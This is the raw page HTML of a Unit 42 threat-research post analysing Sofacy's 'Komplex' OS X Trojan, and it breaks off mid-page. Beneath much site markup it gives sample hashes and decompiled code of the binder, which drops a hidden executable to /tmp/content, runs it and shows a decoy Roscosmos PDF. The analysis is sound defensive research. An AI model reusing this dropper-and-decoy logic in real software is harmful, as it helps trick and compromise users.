var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='application/json' id="wpp-json">
{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":19694,"token":"ca80e59221","lang":0,"debug":0}
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=5.2.4'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.4.3'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=19694' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.4.3 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>

  <body class="post-template-default single single-post postid-19694 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <!--<img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" />-->
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/images/svg/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>


  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Sofacy’s ‘Komplex’ OS X Trojan</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-19694 entry-meta">
				
				
				<span class="post-views-count">46,363</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'19694','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/share?text=Sofacy%E2%80%99s+%E2%80%98Komplex%E2%80%99+OS+X+Trojan&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F&title=Sofacy%E2%80%99s+%E2%80%98Komplex%E2%80%99+OS+X+Trojan&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>
    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/dani-creus/" title="Posts by Dani Creus" class="author url fn" rel="author">Dani Creus</a>, <a href="https://unit42.paloaltonetworks.com/author/tyler-halfpop/" title="Posts by Tyler Halfpop" class="author url fn" rel="author">Tyler Halfpop</a> and <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2016-09-26T08:00:01+00:00">September 26, 2016 at 11:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/aerospace/" rel="tag">aerospace</a>, <a href="https://unit42.paloaltonetworks.com/tag/komplex/" rel="tag">Komplex</a>, <a href="https://unit42.paloaltonetworks.com/tag/os-x/" rel="tag">OS X</a>, <a href="https://unit42.paloaltonetworks.com/tag/sofacy/" rel="tag">Sofacy</a>, <a href="https://unit42.paloaltonetworks.com/tag/trojan/" rel="tag">Trojan</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/blog-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-sofacys-komplex-os-x-trojan/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>Unit 42 researchers identified a new OS X Trojan associated with the Sofacy group that we are now tracking with the 'Komplex' tag using the Palo Alto Networks AutoFocus threat intelligence platform.</p>
<p>The Sofacy group, also known as APT28, Pawn Storm, Fancy Bear, and Sednit, continues to add to the variety of tools they use in attacks; in this case, targeting individuals in the aerospace industry running the OS X operating system. During our analysis, we determined that Komplex was used in a previous attack campaign targeting individuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as a payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy - the Carberp variant that Sofacy had used in <a href="http://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/" target="_blank">previous attack campaigns</a> on systems running Windows. In addition to shared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped with previously identified phishing campaign infrastructures associated with the Sofacy group.<span id="more-19694"></span></p>
<h3>Komplex Binder</h3>
<p>Komplex is a Trojan that the Sofacy group created to compromise individuals using OS X devices. The Trojan has multiple parts, first leading with a binder component that is responsible for saving a second payload and a decoy document to the system. We found three different versions of the Komplex binder, one that was created to run on x86, another on x64, and a third that contained binders for both x86 and x64 architectures. We found the following samples of the Komplex binder:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a552e415008143" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134: Mach-O 64-
bit executable x86_64
c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7: Mach-O 
executable i386
cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4: Mach-O 
universal binary with 2 architectures</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a552e415008143-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a552e415008143-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a552e415008143-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a552e415008143-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a552e415008143-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a552e415008143-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a552e415008143-1"><span class="crayon-cn">2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mach</span><span class="crayon-o">-</span><span class="crayon-i">O</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-o">-</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a552e415008143-2"><span class="crayon-e">bit </span><span class="crayon-e">executable </span><span class="crayon-e">x86_64</span></div><div class="crayon-line" id="crayon-60a9b5c8a552e415008143-3"><span class="crayon-v">c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mach</span><span class="crayon-o">-</span><span class="crayon-i">O</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a552e415008143-4"><span class="crayon-e">executable </span><span class="crayon-e">i386</span></div><div class="crayon-line" id="crayon-60a9b5c8a552e415008143-5"><span class="crayon-v">cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mach</span><span class="crayon-o">-</span><span class="crayon-i">O</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a552e415008143-6"><span class="crayon-e">universal </span><span class="crayon-e">binary </span><span class="crayon-i">with</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-v">architectures</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>Regardless of architecture, these initial binders all save a second embedded Mach-O file to ‘/tmp/content’. This file is the Komplex dropper used in the next stage of installation and to maintain persistence. After saving the Komplex dropper, these binders would then save a legitimate decoy document to the system and open them using the ‘Preview’ application to minimize suspicion of any malicious activity. Figure 1 shows the main function found in one of the initial droppers that saves and opens a PDF decoy, as well as executes another executable file saved as ‘/tmp/content’.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a5536700342485" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int _main(int arg0, int arg1) {
    var_28 = [[NSAutoreleasePool alloc] init];
    var_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];
    var_40 = [NSString stringWithFormat:@"%@/roskosmos_2015-2025.pdf", var_38];
    var_48 = [NSString stringWithFormat:@"SetFile -a E %@/roskosmos_2015-2025.pdf", 
var_38];
    var_50 = [NSString stringWithFormat:@"rm -rf %@/roskosmos_2015-2025.app", var_38];
    var_58 = [NSString stringWithFormat:@"open -a Preview.app %@/roskosmos_2015-
2025.pdf", var_38];
    [[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@"/tmp/content" 
atomically:0x1];
    system([var_50 UTF8String]);
    system("chmod 755 /tmp/content");
    [[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 atomically:0x1];
    system([var_48 UTF8String]);
    var_70 = [[NSTask alloc] init];
    [var_70 setLaunchPath:@"/tmp/content"];
    [var_70 launch];
    [var_70 waitUntilExit];
    system([var_58 UTF8String]);
    remove(*arg1);
    [var_28 release];
    return 0x0;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-6">6</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-8">8</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5536700342485-10">10</div><div class="crayon-num" data-line="crayon-60a9b5c8a5536700342485-11">11</div><div 